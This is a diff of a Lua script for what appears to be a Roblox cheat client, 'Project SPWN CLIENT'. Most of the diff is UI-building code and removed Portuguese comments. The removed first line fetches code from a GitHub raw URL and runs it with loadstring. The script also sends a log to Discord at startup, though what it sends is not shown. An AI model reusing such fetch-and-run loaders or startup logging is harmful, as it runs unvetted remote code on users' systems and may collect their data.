@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/function-fin/01/refs/heads/main/01"))()
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -57,12 +56,8 @@ local function EnviarLogDiscord()
     end)
 end
 
--- Envia a notificação imediatamente
 EnviarLogDiscord()
 
--- ==========================================
--- ESTRUTURA PRINCIPAL DO SCRIPT / UI
--- ==========================================
 local TweenService, CoreGui, UIS = game:GetService("TweenService"), game:GetService("CoreGui"), game:GetService("UserInputService")
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
@@ -124,7 +119,6 @@ local PageAbout = Create("ScrollingFrame", MainFrame, {Size = UDim2.new(1, -20, 
 Create("UIPadding", PageAbout, {PaddingLeft = UDim.new(0, 6), PaddingRight = UDim.new(0, 12), PaddingTop = UDim.new(0, 5)})
 Create("TextLabel", PageAbout, {Size = UDim2.new(1, 0, 0, 540), BackgroundTransparency = 1, Text = '// ACCESS LOG] O Project SPWN CLIENT consiste na criação de um script com funções universais, desenvolvido para se expandir por diversos jogos da plataforma Roblox. O objective do projeto é explorar, desenvolver e reunir todo tipo de sistema, ferramenta e ideia que possa ser aplicada em diferentes experiências, sempre trazendo novas funcionalidades e buscando inovação. Além de criar sistemas para diversos jogos, o Project SPAWN CLIENT também tem como objetivo construir uma comunidade de desenvolvedores interessados em compartilhar conhecimento, ensinar o desenvolvimento de projetos e trocar experiências sobre Vibe Coding. Se você deseja fazer parte do Project SPAWN CLIENT, conhecer mais sobre a iniciativa ou contribuir com ideias, desenvolver sistemas, criar designs ou acompanhar sua evolução, entre no servidor do Discord do Project ( Signature CHROLLO)', TextColor3 = Color3.fromRGB(255,255,255), TextSize = 15, Font = Enum.Font.Arcade, TextWrapped = true, RichText = true, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top})
 
--- IMAGEM ADICIONADA ABAIXO DAS ESCRITURAS (ID: 77667780640343)
 local SymbolAboutImage = Create("ImageLabel", PageAbout, {
     Name = "SymbolAboutImage",
     Size = UDim2.new(0, 140, 0, 140),
@@ -146,7 +140,6 @@ local WhiteBarSeparator = Create("Frame", MainFrame, {Name = "WhiteBarSeparator"
 
 local FooterBar = Create("Frame", MainFrame, {Size = UDim2.new(1, 0, 0, 65), Position = UDim2.new(0, 0, 1, -65), BackgroundColor3 = Color3.fromRGB(22,22,22), BorderSizePixel = 0})
 
--- BOTÃO FECHAR UI COM FUNDO PRETO E BORDA BRANCA
 local CloseBtn = Create("TextButton", FooterBar, {Name = "CloseBtn", Size = UDim2.new(0, 160, 0, 42), Position = UDim2.new(0.5, -80, 0.5, -21), BackgroundColor3 = Color3.fromRGB(0,0,0), Text = "FECHAR UI", TextColor3 = Color3.fromRGB(255,255,255), TextSize = 22, Font = Enum.Font.Arcade}, 6, {Color = Color3.fromRGB(255,255,255), Thickness = 1.5, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
 CloseBtn.MouseButton1Click:Connect(function() PlayClickSound(); MainFrame.Visible = false end)
 
